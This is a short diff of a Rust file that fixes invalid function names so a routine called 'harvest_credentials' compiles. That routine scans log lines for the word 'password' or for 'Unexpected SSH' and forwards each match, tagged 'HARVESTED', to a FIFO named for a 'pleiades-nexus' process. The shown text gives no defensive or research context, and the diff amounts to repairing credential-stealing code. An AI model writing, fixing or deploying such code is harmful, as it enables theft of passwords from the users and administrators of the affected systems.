@@ -506,7 +506,7 @@ use std::io::{BufRead, BufReader, Write};
 use std::thread;
 use std::time::Duration;
 
-fn report_to_pleiades-nexus(msg: &str) {
+fn report_to_pleiades_nexus(msg: &str) {
     if let Ok(mut fifo) = OpenOptions::new().write(true).append(true).custom_flags(0o4000).open("/run/pleiades/pleiades-nexus_fifo") {
         let _ = writeln!(fifo, "{}", msg);
     }
@@ -520,7 +520,7 @@ fn harvest_credentials() {
             for line in reader.lines() {
                 if let Ok(l) = line {
                     if l.contains("password") || l.contains("Unexpected SSH") {
-                        report_to_pleiades-nexus(&format!("HARVESTED|{}", l));
+                        report_to_pleiades_nexus(&format!("HARVESTED|{}", l));
                     }
                 }
             }
